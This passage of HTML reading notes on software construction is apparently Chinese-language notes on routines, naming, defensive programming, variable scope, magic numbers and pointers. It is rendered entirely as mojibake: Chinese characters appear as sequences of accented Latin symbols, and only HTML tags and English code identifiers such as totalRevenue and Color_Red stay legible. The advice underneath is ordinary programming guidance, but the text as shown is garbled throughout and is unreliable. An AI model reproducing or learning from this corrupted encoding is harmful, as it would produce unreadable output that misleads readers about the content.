ä»¥åŠè°ƒç”¨å…¶ä»–å­ç¨‹åºçš„è¯­å¥ç»„æˆï¼Œé‚£ä¹ˆè¿™æ ·ä¸€ä¸ªé€»è¾‘ä¸Šçš„å†…èšæ€§çš„å­ç¨‹åºé€šå¸¸ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå­ç¨‹åºçš„å”¯ä¸€åŠŸèƒ½å°±æ˜¯å‘å¸ƒå‘½ä»¤ï¼Œå…¶è‡ªèº«å¹¶ä¸åšä»»ä½•å¤„ç†ï¼Œè¿™ç§å­ç¨‹åºè¢«ç§°ä¸ºäº‹ä»¶å¤„ç†å™¨</li><li>å·§åˆçš„å†…èšæ€§ã€‚æŒ‡å­ç¨‹åºå„æ“ä½œé—´æ²¡æœ‰ä»»ä½•å¯ä»¥çœ‹åˆ°çš„å…³è”</li></ol><p><font color='red'>å¦‚æœä¸€ä¸ªå­ç¨‹åºå…·æœ‰ä¸è‰¯çš„å†…èšæ€§ï¼Œé‚£æœ€å¥½è¿˜æ˜¯èŠ±åŠŸå¤«é‡æ–°ç¼–å†™ï¼Œä½¿å…¶å…·æœ‰æ›´å¥½çš„å†…èšæ€§ï¼Œè€Œä¸æ˜¯å†å»èŠ±ç²¾åŠ›ç²¾ç¡®åœ°è¯Šæ–­é—®é¢˜æ‰€åœ¨äº†ã€‚</font></p><p>ä¸å…¶é™åˆ¶å­ç¨‹åºçš„é•¿åº¦ï¼Œä¸å¦‚è®©ä»¥ä¸‹å› ç´ â€”â€”å†…èšæ€§ï¼ŒåµŒå¥—çš„å±‚æ¬¡ï¼Œå˜é‡çš„æ•°é‡ï¼Œå†³ç­–ç‚¹çš„æ•°é‡ï¼Œè§£é‡Šå­ç¨‹åºçš„æ³¨é‡ŠåŠå…¶ä»–ä¸€äº›å’Œå¤æ‚åº¦ç›¸å…³çš„è€ƒè™‘â€”â€”æ¥å†³å®šå­ç¨‹åºçš„é•¿åº¦ã€‚ä½†å­ç¨‹åºçš„é•¿åº¦å°½é‡æ§åˆ¶åœ¨200è¡Œä»¥å†…ï¼Œ</p><p>å­ç¨‹åºå‚æ•°åº”è¯¥æŒ‰ç…§â€œè¾“å…¥-ä¿®æ”¹-è¾“å‡ºâ€çš„é¡ºåºæ’åˆ—å‚æ•°ã€‚å³å…ˆåˆ—å‡ºä»…ä½œä¸ºè¾“å…¥ç”¨é€”çš„å‚æ•°ï¼Œç„¶åæ˜¯æ—¢ä½œä¸ºè¾“å…¥åˆä½œä¸ºè¾“å‡ºç”¨é€”çš„å‚æ•°ï¼Œæœ€åæ‰æ˜¯ä»…ä½œä¸ºè¾“å‡ºç”¨é€”çš„å‚æ•°ã€‚</p><p><font color='red'>å¦‚æœå‡ ä¸ªå­ç¨‹åºéƒ½ç”¨äº†ç±»ä¼¼çš„ä¸€äº›å‚æ•°ï¼Œåº”è¯¥è®©è¿™äº›å‚æ•°çš„æ’åˆ—é¡ºåºä¿æŒä¸€è‡´ï¼Œä»¥ä¾¿äºè®°å¿†ã€‚åä¾‹ï¼šphpä¸­çš„ <code>array_map()</code> å’Œ <code>array_walk()</code></font></p><p><font color='red'>æŠŠå­ç¨‹åºçš„å‚æ•°ä¸ªæ•°é™åˆ¶åœ¨7ä¸ªä»¥å†…ã€‚</font></p><p>å‡½æ•°æ˜¯æŒ‡æœ‰è¿”å›å€¼çš„å­ç¨‹åºï¼Œè¿‡ç¨‹æ˜¯æŒ‡æ²¡æœ‰è¿”å›å€¼çš„å­ç¨‹åº</p><p>ç¡®ä¿å‡½æ•°æ— æ„å¤–çš„è¿”å›å€¼ã€‚å¯ä»¥åœ¨å‡½æ•°å¼€å¤´è®¾ç½®é»˜è®¤å€¼æ¥é¿å…è¿™ä¸€é£é™©ã€‚</p><p>ä¸è¦è¿”å›æŒ‡å‘å±€éƒ¨æ•°æ®çš„æŒ‡é’ˆæˆ–å¼•ç”¨ã€‚</p><blockquote><p>å¥½çš„å­ç¨‹åºæ³¨é‡Šåº”è¯¥åªç”¨äºè¯´æ˜å‚æ•°ï¼Œè€Œéä¸šåŠ¡é€»è¾‘ã€‚å¦‚æœéœ€è¦åœ¨æ³¨é‡Šä¸­è¯´æ˜äº†ä½ åšäº†ä»€ä¹ˆï¼Œè¦ä¹ˆæ˜¯ä½ å†™çš„å¤ªè¿‡äºå¤æ‚ï¼Œè¦ä¹ˆäº§å“ç»ç†è¯¥ç‚’æ‰ã€‚</p></blockquote><h3 id="å­ç¨‹åºå‘½å"><a href="#å­ç¨‹åºå‘½å" class="headerlink" title="å­ç¨‹åºå‘½å"></a>å­ç¨‹åºå‘½å</h3><p>å¥½çš„å­ç¨‹åºåèƒ½æ¸…æ™°åœ°æè¿°å­ç¨‹åºæ‰€åšçš„ä¸€åˆ‡ã€‚è¿™é‡Œæ˜¯æœ‰æ•ˆçš„ç»™å­ç¨‹åºå‘½åçš„ä¸€äº›æŒ‡å¯¼åŸåˆ™ï¼š</p><ul><li>æè¿°å­ç¨‹åºæ‰€åšçš„æ‰€æœ‰äº‹æƒ…</li><li>é¿å…ä½¿ç”¨æ— æ„ä¹‰çš„ã€æ¨¡ç³Šæˆ–è¡¨è¿°ä¸æ¸…çš„åŠ¨è¯<ul><li>é”™è¯¯çš„å‘½åï¼š<code>HandleCalculation()</code>, <code>PerformServices()</code>, <code>OutputUser()</code>, <code>ProcessInput()</code>, <code>DelWithOutput()</code></li><li>æ­£ç¡®çš„å‘½åï¼š<code>HandleOutput()</code> ===&gt; <code>FormatAndPrintOutPut()</code></li></ul></li><li>ä¸è¦ä»…é€šè¿‡æ•°å­—æ¥å½¢æˆä¸åŒçš„å­ç¨‹åºåå­—</li><li>æ ¹æ®éœ€è¦ç¡®å®šå­ç¨‹åºåå­—é•¿åº¦<ul><li>ç ”ç©¶è¡¨æ˜ï¼Œå˜é‡åçš„æœ€ä½³é•¿åº¦æ˜¯ 9~15 ä¸ªå­—ç¬¦ã€‚å­ç¨‹åºé€šå¸¸æ¯”å˜é‡æ›´ä¸ºå¤æ‚ï¼Œå› æ­¤ï¼Œå¥½çš„å­ç¨‹åºåå­—é€šå¸¸ä¹Ÿä¼šæ›´é•¿ä¸€äº›ã€‚å¦ä¸€æ–¹é¢ï¼Œå­ç¨‹åºåå­—é€šå¸¸æ˜¯è·Ÿåœ¨å¯¹è±¡åå­—ä¹‹åï¼Œè¿™å®é™…ä¸Šä¸ºå…¶å…è´¹æä¾›äº†ä¸€éƒ¨åˆ†åå­—ã€‚æ€»çš„æ¥è¯´ï¼Œç»™å­ç¨‹åºå‘½åçš„é‡ç‚¹æ˜¯å°½å¯èƒ½å«ä¹‰æ¸…æ™°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå­ç¨‹åºåçš„é•¿çŸ­è¦è§†è¯¥åå­—æ˜¯å¦æ¸…æ™°æ˜“æ‡‚è€Œå®šã€‚</li></ul></li><li>ç»™å‡½æ•°å‘½åæ—¶è¦å¯¹è¿”å›å€¼æœ‰æ‰€æè¿°</li><li>ç»™è¿‡ç¨‹èµ·åæ—¶ä½¿ç”¨è¯­æ°”å¼ºçƒˆçš„åŠ¨è¯åŠ å®¾è¯­çš„å½¢å¼</li><li>å‡†ç¡®ä½¿ç”¨å¯¹ä»—è¯<ul><li>add/remove</li><li>begin/end</li><li>create/destroy</li><li>first/last</li><li>get/put</li><li>get/set</li><li>increment/decrement</li><li>insert/delete</li><li>lock/unlock</li><li>mix/max</li><li>next/previous</li><li>old/new</li><li>open/close</li><li>show/hide</li><li>source/target</li><li>start/stop</li><li>up/down</li></ul></li><li>ä¸ºå¸¸ç”¨æ“ä½œç¡®ç«‹å‘½åè§„åˆ™</li></ul><h2 id="ç¬¬8ç« -é˜²èŒƒå¼ç¼–ç¨‹"><a href="#ç¬¬8ç« -é˜²èŒƒå¼ç¼–ç¨‹" class="headerlink" title="ç¬¬8ç«  é˜²èŒƒå¼ç¼–ç¨‹"></a>ç¬¬8ç«  é˜²èŒƒå¼ç¼–ç¨‹</h2><p>åœ¨é˜²å¾¡å¼é©¾é©¶ä¸­è¦å»ºç«‹è¿™æ ·ä¸€ç§æ€ç»´ï¼Œé‚£å°±æ˜¯ä½ æ°¸è¿œä¹Ÿä¸èƒ½ç¡®å®šå¦ä¸€ä½å¸æœºå°†è¦åšä»€ä¹ˆã€‚è¿™æ ·æ‰èƒ½ç¡®ä¿åœ¨å…¶ä»–äººåšå‡ºå±é™©åŠ¨ä½œæ—¶ä½ ä¹Ÿä¸ä¼šå—åˆ°ä¼¤å®³ã€‚ä½ è¦æ‰¿æ‹…èµ·ä¿æŠ¤è‡ªå·±çš„è´£ä»»ï¼Œå“ªæ€•æ˜¯å…¶ä»–å¸æœºçŠ¯çš„é”™è¯¯ã€‚é˜²å¾¡å¼ç¼–ç¨‹çš„ä¸»è¦æ€æƒ³æ˜¯ï¼šå­ç¨‹åºåº”è¯¥ä¸å› ä¼ å…¥é”™è¯¯æ•°æ®è€Œè¢«ç ´åï¼Œå“ªæ€•æ˜¯ç”±äºå…¶ä»–å­ç¨‹åºäº§ç”Ÿçš„é”™è¯¯æ•°æ®ã€‚</p><p>å¦‚ä½•åšåˆ°é˜²èŒƒå¼ç¼–ç¨‹ï¼Ÿ</p><ul><li>æ£€æŸ¥æ‰€æœ‰æ¥æºäºå¤–éƒ¨çš„æ•°æ®å€¼</li><li>æ£€æŸ¥å†…éƒ¨ç¨‹åºçš„ä¼ å…¥å‚æ•°</li><li>å†³å®šå¦‚ä½•å¤„ç†é”™è¯¯çš„è¾“å…¥æ•°æ®</li></ul><h2 id="ç¬¬9ç« -ä¼ªä»£ç ç¼–ç¨‹è¿‡ç¨‹"><a href="#ç¬¬9ç« -ä¼ªä»£ç ç¼–ç¨‹è¿‡ç¨‹" class="headerlink" title="ç¬¬9ç«  ä¼ªä»£ç ç¼–ç¨‹è¿‡ç¨‹"></a>ç¬¬9ç«  ä¼ªä»£ç ç¼–ç¨‹è¿‡ç¨‹</h2><p>ä¼ªä»£ç èƒ½è®©ä½ ä»æ›´å®è§‚çš„å±‚æ¬¡äº†è§£ä½ å³å°†ç¼–å†™çš„é¡¹ç›®ï¼Œåˆ’å®šä½ çš„å¼€å‘è®¡åˆ’ï¼Œé¿å…åœ¨å¼€å‘é€”ä¸­é€æ¸åç¦»ä¸»èˆªé“ã€‚åŒæ—¶ï¼Œä¼ªä»£ç ä¹Ÿèƒ½è¾ƒä¸ºæ¸…æ™°çš„çœ‹å‡ºè®¾è®¡æ–¹æ¡ˆçš„ç¼ºé™·ï¼Œè®©é”™è¯¯åŠæ—©å‘ç°å’Œçº æ­£ã€‚</p><p>è¯·åœ¨ç¡®ä¿¡ä»£ç æ˜¯æ­£ç¡®çš„æ—¶å€™æ‰§è¡Œï¼Œé¿å…å…ˆä¸œæ‹¼è¥¿å‡‘ï¼Œç„¶åé€šè¿‡è¿è¡Œæ¥æŸ¥çœ‹ä»£ç æ˜¯å¦æ­£å¸¸çš„æ€ªåœˆï¼Œè¿™ç§æ–¹å¼æ€»æ˜¯è®©ä½ èŠ±è´¹æ›´å¤šçš„æ—¶é—´ã€‚</p><h2 id="ç¬¬10ç« -ä½¿ç”¨å˜é‡çš„ä¸€èˆ¬äº‹é¡¹"><a href="#ç¬¬10ç« -ä½¿ç”¨å˜é‡çš„ä¸€èˆ¬äº‹é¡¹" class="headerlink" title="ç¬¬10ç«  ä½¿ç”¨å˜é‡çš„ä¸€èˆ¬äº‹é¡¹"></a>ç¬¬10ç«  ä½¿ç”¨å˜é‡çš„ä¸€èˆ¬äº‹é¡¹</h2><ul><li>åœ¨é è¿‘ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„ä½ç½®å£°æ˜å’Œåˆå§‹åŒ–å˜é‡</li><li>ç‰¹åˆ«æ³¨æ„è®¡æ•°å™¨å’Œç´¯åŠ å™¨<code>iã€jã€kã€sum</code>å’Œ<code>total</code>ç­‰å˜é‡å¸¸ç”¨åšè®¡æ•°å™¨æˆ–ç´¯åŠ å™¨ï¼Œåœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨è¿™äº›å˜é‡å‰å¿˜è®°é‡ç½®å…¶å€¼ä¹Ÿæ˜¯ä¸€ç§å¸¸è§é”™è¯¯ã€‚</li><li>åœ¨ç±»çš„æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–è¯¥ç±»çš„æ•°æ®æˆå‘˜</li><li>æ£€æŸ¥æ˜¯å¦éœ€è¦é‡æ–°åˆå§‹åŒ–ï¼Œæ¯”å¦‚<code>foreach</code>å¾ªç¯ä¸­çš„å€¼</li><li>æ£€æŸ¥è¾“å…¥å‚æ•°çš„åˆæ³•æ€§</li><li>å°½å¯èƒ½å°†å˜é‡çš„å¼•ç”¨é›†ä¸­èµ·æ¥ï¼Œä»¥æé«˜ç¨‹åºçš„å¯è¯»æ€§</li><li>å¼€å§‹æ—¶é‡‡ç”¨æœ€ä¸¥æ ¼çš„å¯è§æ€§ï¼Œç„¶åæ ¹æ®éœ€è¦æ‰©å±•å˜é‡çš„ä½œç”¨åŸŸã€‚æŠŠä¸€ä¸ª<code>protected</code>æ•°æ®è½¬æ¢ä¸º<code>private</code>éš¾åº¦æ¯”åå‘è¦å¤§ï¼Œå› æ­¤åº”è¯¥é€‰æ‹©å˜é‡æ‰€èƒ½å…·æœ‰çš„æœ€å°çš„ä½œç”¨åŸŸã€‚</li><li><strong>åº”è¯¥æŠŠæ¯ä¸ªå˜é‡å®šä¹‰æˆåªå¯¹éœ€è¦çœ‹åˆ°å®ƒçš„ã€æœ€å°èŒƒå›´çš„ä»£ç æ®µå¯è§</strong>ã€‚å¦‚æœèƒ½æŠŠå˜é‡çš„ä½œç”¨äºé™å®šåˆ°ä¸€ä¸ªå•ç‹¬çš„å¾ªç¯æˆ–è€…å­ç¨‹åºï¼Œé‚£æœ€å¥½ä¸è¿‡äº†ã€‚å¦‚æœä½ æ— æ³•æŠŠä½œç”¨åŸŸé™å®šåœ¨ä¸€ä¸ªå­ç¨‹åºé‡Œï¼Œé‚£å°±æŠŠå¯è§æ€§é™å®šåˆ°æŸä¸ªç±»å†…éƒ¨çš„å­ç¨‹åºã€‚å¦‚æœæ— æ³•ä½ æŠŠå˜é‡çš„ä½œç”¨åŸŸé™å®šåœ¨æœ€è¯¥å˜é‡æ‰¿æ‹…çš„æœ€ä¸»è¦çš„è´£ä»»çš„é‚£ä¸ªç±»é‡Œé¢ï¼Œé‚£ä¹ˆå°±åˆ›å»ºä¸€äº›è®¿é—®å™¨å­ç¨‹åºæ¥è®©å…¶ä»–ç±»å…±äº«è¯¥å˜é‡çš„æ•°æ®ã€‚</li><li>æ¯ä¸ªå˜é‡åªç”¨äºå•ä¸€ç”¨é€”ï¼Œä¸”å˜é‡å«ä¹‰æ˜ç¡®</li></ul><p>å‡å°ä½œç”¨åŸŸçš„ä¸€èˆ¬åŸåˆ™</p><ul><li>åœ¨å¾ªç¯å¼€å§‹ä¹‹å‰å†å»åˆå§‹åŒ–è¯¥å¾ªç¯é‡Œä½¿ç”¨çš„å˜é‡ï¼Œè€Œä¸æ˜¯åœ¨è¯¥å¾ªç¯æ‰€å±çš„å­ç¨‹åºçš„å¼€å§‹å¤„åˆå§‹åŒ–è¿™äº›å˜é‡</li><li>ç›´åˆ°å˜é‡å³å°†è¢«ä½¿ç”¨æ—¶å†ä¸ºå…¶èµ‹å€¼</li><li>æŠŠç›¸å…³è¯­å¥æ”¾åˆ°ä¸€èµ·</li><li>æŠŠç›¸å…³è¯­å¥ç»„æå–æˆå•ç‹¬çš„å­ç¨‹åº</li></ul><h2 id="ç¬¬11ç« -å˜é‡åçš„åŠ›é‡"><a href="#ç¬¬11ç« -å˜é‡åçš„åŠ›é‡" class="headerlink" title="ç¬¬11ç«  å˜é‡åçš„åŠ›é‡"></a>ç¬¬11ç«  å˜é‡åçš„åŠ›é‡</h2><p>ä¸ºå˜é‡å‘½åæ—¶æœ€é‡è¦çš„è€ƒè™‘äº‹é¡¹æ˜¯ï¼šè¯¥åå­—è¦å®Œå…¨ã€å‡†ç¡®åœ°æè¿°å‡ºè¯¥å˜é‡æ‰€ä»£è¡¨çš„äº‹ç‰©ã€‚é€šå¸¸ï¼Œå¯¹å˜é‡çš„æè¿°å°±æ˜¯æœ€ä½³çš„å˜é‡åï¼Œè¿™ç§åå­—å¾ˆå®¹æ˜“é˜…è¯»ï¼Œè€Œä¸”æ²¡æœ‰æ­§ä¹‰ã€‚</p><p><strong>å˜é‡åé•¿åº¦åœ¨12ä¸ªå·¦å³ä¸ºå®œã€‚</strong></p><p>å–å˜é‡åæ—¶ï¼Œåº”è¯¥ä»¥é—®é¢˜ä¸ºå¯¼å‘ï¼Œå¦‚ä¸€æ¡å‘˜å·¥çš„è®°å½•å¯ä»¥ç§°ä½œ<code>inputRec</code>æˆ–<code>employeeData</code>ï¼Œå‰è€…åæ˜ çš„æ˜¯è¾“å…¥ã€è®°å½•è¿™äº›è®¡ç®—æ¦‚å¿µçš„è®¡ç®—æœºæœ¯è¯­ï¼Œåè€…åˆ™ç›´æŒ‡é—®é¢˜é¢†åŸŸï¼Œä¸è®¡ç®—æœºä¸–ç•Œæ— å…³ã€‚å½“è¡¨ç¤ºä¸€ä¸ªæ‰“å°æœºçŠ¶æ€çš„ä½åŸŸæ—¶ï¼Œ<code>bitFlag</code> è¦æ¯” <code>printerReady</code>æ›´å…·æœ‰è®¡ç®—æœºç‰¹å¾ã€‚</p><h3 id="å˜é‡åä¸­çš„è®¡ç®—å€¼é™å®šè¯"><a href="#å˜é‡åä¸­çš„è®¡ç®—å€¼é™å®šè¯" class="headerlink" title="å˜é‡åä¸­çš„è®¡ç®—å€¼é™å®šè¯"></a>å˜é‡åä¸­çš„è®¡ç®—å€¼é™å®šè¯</h3><p>å¾ˆå¤šç¨‹åºéƒ½æœ‰è¡¨ç¤ºè®¡ç®—ç»“æœçš„å˜é‡ï¼šæ€»é¢ã€å¹³å‡å€¼ã€æœ€å¤§å€¼ç­‰ç­‰ã€‚å¦‚æœä½ è¦ç”¨ç±»ä¼¼äº Totalã€Sumã€Averageã€Maxã€Minã€Recordã€Stringã€Pointer è¿™æ ·çš„é™å®šè¯æ¥ä¿®æ”¹æŸä¸ªåå­—ï¼Œé‚£ä¹ˆè¯·è®°ä½æŠŠé™å®šè¯åŠ åˆ°åå­—çš„æœ€åã€‚</p><p>è¿™ç§æ–¹æ³•æœ‰ç‹ æ¯’å¶æœ‰ç‚¹ã€‚é¦–å…ˆï¼Œå˜é‡åä¸­æœ€ç»ˆçš„é‚£éƒ¨åˆ†ï¼Œå³ä¸ºè¿™ä¸€å˜é‡èµ‹äºˆä¸»è¦å«ä¹‰çš„éƒ¨åˆ†åº”å½“ä½äºæœ€å‰é¢ï¼Œè¿™æ ·ï¼Œè¿™ä¸€éƒ¨åˆ†å°±å¯ä»¥æ˜¾å¾—æœ€ä¸ºçªå‡ºï¼Œç‚³è¾‰è¢«é¦–å…ˆé˜…è¯»åˆ°ã€‚å…¶æ¬¡ï¼Œé‡‡çº³äº†è¿™ä¸€è§„åˆ™ï¼Œä½ å°†é¿å…ç”±äºåŒæ—¶åœ¨ç¨‹åºä¸­ä½¿ç”¨ totalRevenue å’Œ revenueTotal è€Œäº§ç”Ÿçš„æ­§ä¹‰ã€‚è¿™äº›åå­—åœ¨è¯­ä¹‰ä¸Šæ˜¯ç­‰ä»·çš„ï¼Œä¸Šè¿°è§„åˆ™å¯ä»¥é¿å…å°†ä»–ä»¬å½“åšä¸åŒçš„ä¸œè¥¿ä½¿ç”¨ã€‚è¿˜æœ‰ï¼Œç±»ä¼¼ revenueTotalã€expenseTotalã€revenueAverageã€expenseAverage è¿™ç»„åå­—çš„å˜é‡å…·æœ‰éå¸¸ä¼˜é›…çš„å¯¹ç§°æ€§ã€‚è€Œä» totalRevenueã€expenseTotalã€revenueAverageã€averageExpense è¿™ç»„åå­—ä¸­åˆ™çœ‹ä¸å‡ºä»€ä¹ˆè§„å¾‹æ¥ã€‚æ€»ä¹‹ï¼Œä¸€è‡´æ€§å¯ä»¥æé«˜å¯è¯»æ€§ï¼Œç®€åŒ–ç»´æŠ¤å·¥ä½œã€‚</p><p>æŠŠè®¡ç®—çš„é‡æ”¾åœ¨åå­—æœ€åçš„è¿™æ¡è§„åˆ™ä¹Ÿæœ‰ä¾‹å¤–ï¼Œé‚£å°±æ˜¯ Num é™å®šè¯çš„ä½ç½®å·²ç»æ˜¯çº¦å®šä¿—æˆçš„ã€‚Num æ”¾åœ¨å˜é‡åçš„å¼€å§‹ä½ç½®ä»£è¡¨ä¸€ä¸ªæ€»æ•°ï¼šnumCustomers è¡¨ç¤ºçš„æ˜¯å‘˜å·¥çš„æ€»æ•°ã€‚Num æ”¾åœ¨å˜é‡åçš„ç»“æŸä½ç½®ä»£è¡¨ä¸€ä¸ªä¸‹æ ‡ï¼šcustomerNum è¡¨ç¤ºçš„æ˜¯å½“å‰å‘˜å·¥çš„åºå·ã€‚é€šè¿‡ numCustomers æœ€åä»£è¡¨å¤æ•°çš„ s ä¹Ÿèƒ½çœ‹å‡ºè¿™ä¸¤ç§åº”ç”¨ä¹‹é—´çš„åŒºåˆ«ã€‚ç„¶è€Œï¼Œç”±äºè¿™æ ·ä½¿ç”¨çš„ Num å¸¸å¸¸ä¼šå¸¦æ¥éº»çƒ¦ï¼Œå› æ­¤å¯èƒ½æœ€å¥½çš„åŠæ³•æ˜¯é¿å¼€è¿™äº›é—®é¢˜ï¼Œç”¨ Count æˆ– Total æ¥ä»£è¡¨å‘˜å·¥çš„æ€»æ•°ï¼Œç”¨ Index æ¥æŒ‡ä»£æŸä¸ªç‰¹å®šå‘˜å·¥ã€‚è¿™æ ·ï¼ŒcustomerCount å°±ä»£è¡¨å‘˜å·¥çš„æ€»æ•°ï¼ŒcustomerIndex ä»£è¡¨æŸä¸ªç‰¹å®šçš„å‘˜å·¥ã€‚</p><h3 id="å˜é‡ä¸­å¸¸ç”¨çš„å¯¹ä»—è¯"><a href="#å˜é‡ä¸­å¸¸ç”¨çš„å¯¹ä»—è¯" class="headerlink" title="å˜é‡ä¸­å¸¸ç”¨çš„å¯¹ä»—è¯"></a>å˜é‡ä¸­å¸¸ç”¨çš„å¯¹ä»—è¯</h3><ul><li>begin/end</li><li>first/last</li><li>locked/unlocked</li><li>min/max</li><li>next/previous</li><li>old/new</li><li>opened/closed</li><li>visible/invisible</li><li>source/target</li><li>source/destination</li><li>up/down</li></ul><h2 id="ç¬¬12ç« -åŸºæœ¬æ•°æ®ç±»å‹"><a href="#ç¬¬12ç« -åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="ç¬¬12ç«  åŸºæœ¬æ•°æ®ç±»å‹"></a>ç¬¬12ç«  åŸºæœ¬æ•°æ®ç±»å‹</h2><p><strong>é¿å…ä½¿ç”¨â€œç¥ç§˜æ•°å€¼â€</strong>ã€‚ç¥ç§˜æ•°å€¼ä¼šå¯¼è‡´æ— æ³•æœ›æ–‡çŸ¥æ„ï¼Œç›¸åŒæ•°å€¼åœ¨ä¸åŒä½ç½®å«ä¹‰ä¸åŒç­‰é—®é¢˜ï¼Œè€Œä½¿ç”¨å…·åå¸¸é‡æ¥æ›¿ä»£åˆ™ä¼šè®©ä»£ç ç»´æŠ¤èµ·æ¥æ›´è½»æ¾ã€‚ä¸€æ¡å¾ˆå¥½çš„ç»éªŒæ³•åˆ™æ˜¯ï¼š<strong>ç¨‹åºä¸»ä½“ä¸­ä»…èƒ½å‡ºç°çš„æ•°å€¼å°±æ˜¯ 0 å’Œ 1ã€‚ä»»ä½•å…¶ä»–æ•°å€¼éƒ½åº”è¯¥è½¬æ¢ä¸ºå…·åå¸¸é‡</strong>ã€‚å¦‚è®¢å•çŠ¶æ€ç­‰åœºæ™¯ã€‚</p><p>ç”¨æšä¸¾ç±»å‹æ¥æé«˜å¯è¯»æ€§ä¸å¯é æ€§ï¼Œå¦‚<code>chosenColor = 1</code>ç”¨<code>chosenColor = Color_Red</code>æ¥æ›¿ä»£ä¼šæ›´æ¸…æ™°ã€å‡†ç¡®ã€‚</p><h2 id="ç¬¬13ç« -ä¸å¸¸è§çš„æ•°æ®ç±»å‹"><a href="#ç¬¬13ç« -ä¸å¸¸è§çš„æ•°æ®ç±»å‹" class="headerlink" title="ç¬¬13ç«  ä¸å¸¸è§çš„æ•°æ®ç±»å‹"></a>ç¬¬13ç«  ä¸å¸¸è§çš„æ•°æ®ç±»å‹</h2><h3 id="å…³äºæŒ‡é’ˆ"><a href="#å…³äºæŒ‡é’ˆ" class="headerlink" title="å…³äºæŒ‡é’ˆ"></a>å…³äºæŒ‡é’ˆ</h3><p>å¦‚ä½•è§£é‡Šå†…å­˜ä¸­æŸä¸ªä½ç½®çš„å†…å®¹ï¼Œæ˜¯ç”±æŒ‡é’ˆçš„åŸºç±»å‹(base type)å†³å®šçš„ã€‚å¦‚æœæŸæŒ‡é’ˆæŒ‡å‘æ•´æ•°ï¼Œè¿™å°±æ„å‘³ç€ç¼–è¯‘å™¨ä¼šæŠŠè¯¥æŒ‡é’ˆæ‰€æŒ‡å‘å†…å­˜ä½ç½®çš„æ•°æ®è§£é‡Šä¸ºä¸€ä¸ªæ•´æ•°ã€‚å½“ç„¶ï¼Œä½ å¯ä»¥è®©ä¸€ä¸ªæ•´æ•°æŒ‡é’ˆã€ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‡é’ˆå’Œä¸€ä¸ªæµ®ç‚¹æ•°æŒ‡é’ˆéƒ½æŒ‡å‘åŒä¸€ä¸ªå†…å­˜ä½ç½®ï¼Œä½†å…¶ä¸­ï¼ˆæœ€å¤šï¼‰åªæœ‰ä¸€ä¸ªæŒ‡é’ˆèƒ½æ­£ç¡®åœ°è§£é‡Šè¯¥ä½ç½®çš„å†…å®¹ã€‚</p><h3 id="ä½¿ç”¨æŒ‡é’ˆçš„ä¸€èˆ¬æŠ€å·§"><a href="#ä½¿ç”¨æŒ‡é’ˆçš„ä¸€èˆ¬æŠ€å·§" class="headerlink" title="ä½¿ç”¨æŒ‡é’ˆçš„ä¸€èˆ¬æŠ€å·§"></a>ä½¿ç”¨æŒ‡é’ˆçš„ä¸€èˆ¬æŠ€å·§</h3><p>å¯¹è§£å†³å¾ˆå¤šç±»å‹çš„ç¨‹åºé”™è¯¯æ¥è¯´ï¼Œæœ€å®¹æ˜“çš„ä¸€éƒ¨åˆ†æ˜¯å®šä½é”™è¯¯ï¼Œè€Œéš¾çš„æ˜¯æ›´æ­£é”™è¯¯ã€‚ç„¶è€ŒæŒ‡é’ˆé”™è¯¯çš„æƒ…å†µåˆ™æœ‰æ‰€ä¸åŒã€‚é€šå¸¸ï¼ŒæŒ‡é’ˆé”™è¯¯éƒ½äº§ç”ŸäºæŒ‡é’ˆæŒ‡å‘äº†å®ƒä¸åº”è¯¥æŒ‡å‘çš„ä½ç½®ã€‚å½“ä½ é€šè¿‡ä¸€ä¸ªåäº†çš„æŒ‡é’ˆå˜é‡èµ‹å€¼æ—¶ï¼Œä¼šæŠŠæ•°æ®å†™å…¥æœ¬ä¸è¯¥å†™å€¼çš„å†…å­˜åŒºåŸŸã€‚è¿™ç§°ä¸ºâ€œå†…å­˜ç ´åâ€ã€‚æœ‰æ—¶å†…å­˜ç ´åä¼šå¯¼è‡´å¯æ€•ã€ä¸¥é‡çš„ç³»ç»Ÿå´©æºƒï¼šæœ‰æ—¶å®ƒä¼šç¯¡æ”¹ç¨‹åºå…¶ä»–éƒ¨åˆ†çš„è®¡ç®—ç»“æœã€‚æœ‰æ—¶å®ƒä¼šåªæ˜¯ä½ çš„ç¨‹åºä¸å¯é¢„çŸ¥åœ°è·³è¿‡æŸäº›å­ç¨‹åºï¼›è€Œæœ‰æ—¶å€™å®ƒåˆä»€ä¹ˆäº‹æƒ…éƒ½ä¸åšã€‚åœ¨æœ€åä¸€ç§æƒ…å†µä¸‹ï¼Œè¿™ç§æŒ‡é’ˆé”™è¯¯å°±åƒä¸€é¢—æ»´ç­”ä½œå“çš„å®šæ—¶ç‚¸å¼¹ï¼Œç­‰ç€ä½ æŠŠç¨‹åºæ¼”ç¤ºç»™æœ€é‡è¦å®¢æˆ·çš„å‰ 5 åˆ†é’Ÿæ—¶å¼•çˆ†ã€‚æŒ‡é’ˆé”™è¯¯çš„ç—‡çŠ¶å¸¸å¸¸ä¸å¼•èµ·æŒ‡é’ˆé”™è¯¯çš„åŸå› æ— å…³ã€‚å› æ­¤ï¼Œæ›´æ­£æŒ‡é’ˆé”™è¯¯çš„å¤§éƒ¨åˆ†å·¥ä½œé‡ä¾¿æ˜¯æ‰¾å‡ºå®ƒçš„ä½ç½®ã€‚</p><p>æ­£ç¡®åœ°ä½¿ç”¨æŒ‡é’ˆè¦æ±‚ç¨‹åºå‘˜é‡‡ç”¨ä¸€ç§åŒå‘ç­–ç•¥ã€‚ç¬¬ä¸€ï¼Œè¦é¦–å…ˆé¿å…é€ æˆæŒ‡é’ˆé”™è¯¯ã€‚æŒ‡é’ˆé”™è¯¯å¾ˆéš¾å‘ç°ï¼Œå› æ­¤é‡‡å–ä¸€äº›é¢„é˜²æ€§æªæ–½æ˜¯å€¼å¾—çš„ã€‚å…¶æ¬¡ï¼Œåœ¨ç¼–å†™ä»£ç 